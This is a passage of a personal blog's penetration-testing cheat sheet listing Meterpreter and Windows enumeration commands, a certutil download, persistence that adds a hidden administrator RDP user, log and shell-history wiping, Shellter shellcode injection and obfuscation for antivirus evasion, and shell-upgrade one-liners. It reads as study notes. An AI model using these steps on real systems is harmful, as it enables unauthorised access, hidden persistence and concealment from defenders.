+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">ps</span><span class="w"> </span><span class="p">(</span><span class="n">from</span><span class="w"> </span><span class="n">Meterpreter</span><span class="p">)</span>
+<span class="o">-</span><span class="w"> </span><span class="n">pgrep</span><span class="w"> </span><span class="o">&lt;</span><span class="n">term</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">from</span><span class="w"> </span><span class="n">Meterpreter</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">PID</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="n">matching</span><span class="w"> </span><span class="n">term</span><span class="p">)</span>
+<span class="o">-</span><span class="w"> </span><span class="n">migrate</span><span class="w"> </span><span class="o">&lt;</span><span class="n">PID</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">from</span><span class="w"> </span><span class="n">Meterpreter</span><span class="p">)</span>
+<span class="o">-</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_shares</span><span class="w"> </span><span class="p">(</span><span class="n">msf</span><span class="w"> </span><span class="n">module</span><span class="p">)</span>
+<span class="o">-</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="p">(</span><span class="n">started</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">services</span><span class="p">)</span>
+<span class="o">-</span><span class="w"> </span><span class="n">wmic</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">brief</span>
+<span class="o">-</span><span class="w"> </span><span class="n">tasklist</span><span class="w"> </span><span class="o">/</span><span class="n">SVC</span><span class="w"> </span><span class="p">(</span><span class="n">running</span><span class="w"> </span><span class="n">processes</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">services</span><span class="p">)</span>
+<span class="o">-</span><span class="w"> </span><span class="n">schtasks</span><span class="w"> </span><span class="o">/</span><span class="n">query</span><span class="w"> </span><span class="o">/</span><span class="n">fo</span><span class="w"> </span><span class="n">LIST</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="p">(</span><span class="n">scheduled</span><span class="w"> </span><span class="n">tasks</span><span class="p">)</span>
+</code></pre></div>
+<p>Automated Tools:</p>
+<ul>
+<li>https://github.com/EnginDemirbilek/WinEnum</li>
+<li>https://github.com/411Hall/JAWS</li>
+</ul>
+<h2 id="file-transfer">File Transfer</h2>
+<div class="highlight"><pre><span></span><code>- certutil -urlcache -f &lt;url&gt; &lt;output file&gt;
+</code></pre></div>
+<h2 id="persistence">Persistence</h2>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> exploit/windows/local/persistence_service (msf module)
+<span class="k">-</span> run getgui -e -u &lt;new rdp user&gt; -p &lt;password&gt; (msf script - enable rdp and add user)
+    <span class="k">-</span> The user is removed from the user list in the login page and added to local <span class="gs">*Administrators*</span> and <span class="gs">*Remote Desktop Users*</span> group
+</code></pre></div>
+<h1 id="clearing-your-tracks_1">Clearing your tracks</h1>
+<p>Windows:</p>
+<div class="highlight"><pre><span></span><code>- clearev (msf script)
+- resource &lt;cleanup script&gt; (cleanup script is generate by msf modules themselves)
+</code></pre></div>
+<p>Linux:</p>
+<div class="highlight"><pre><span></span><code>- history -c
+- cat /dev/null &gt; &lt;file to clean | generally history files
+</code></pre></div>
+<h1 id="av-evasion-obfuscation">AV Evasion &amp; Obfuscation</h1>
+<h2 id="shellter">Shellter</h2>
+<p>Shellter is a dynamic shellcode injection tool that can be used in order to inject shellcode into native Windows applications - see <a href="https://www.shellterproject.com/">there</a>.</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nv">sudo</span><span class="w"> </span><span class="nv">wine</span><span class="w"> </span><span class="nv">shellter</span>.<span class="nv">exe</span>
+<span class="o">-</span><span class="w"> </span><span class="nv">Stealth</span><span class="w"> </span><span class="nv">Mode</span>:<span class="w"> </span><span class="nv">makes</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">vector</span><span class="w"> </span><span class="nv">binary</span><span class="w"> </span><span class="k">continue</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">work</span><span class="w"> </span><span class="nv">as</span><span class="w"> </span><span class="nv">intended</span><span class="w"> </span><span class="nv">executing</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">injected</span><span class="w"> </span><span class="nv">shellcode</span><span class="w"> </span><span class="nv">into</span><span class="w"> </span><span class="nv">background</span>.
+</code></pre></div>
+<h2 id="invoke-obfuscation">Invoke-Obfuscation</h2>
+<p>Invoke-Obfuscation is an open source PowerShell v2.0+ compatible PowerShell command and script obfuscator. - see <a href="https://github.com/danielbohannon/Invoke-Obfuscation">there</a>.</p>
+<h1 id="upgrading-shells_1">Upgrading Shells</h1>
+<div class="highlight"><pre><span></span><code><span class="o">-</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shells</span> <span class="p">(</span><span class="n">get</span> <span class="n">available</span> <span class="n">shells</span><span class="p">)</span>
+<span class="o">-</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="p">(</span><span class="k">if</span> <span class="n">available</span><span class="p">)</span>
+<span class="o">-</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> 
+<span class="o">-</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="o">-</span> <span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s1">'exec "/bin/bash";'</span>
+<span class="o">-</span> <span class="n">ruby</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"exec '/bin/bash' "</span>
+</code></pre></div>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
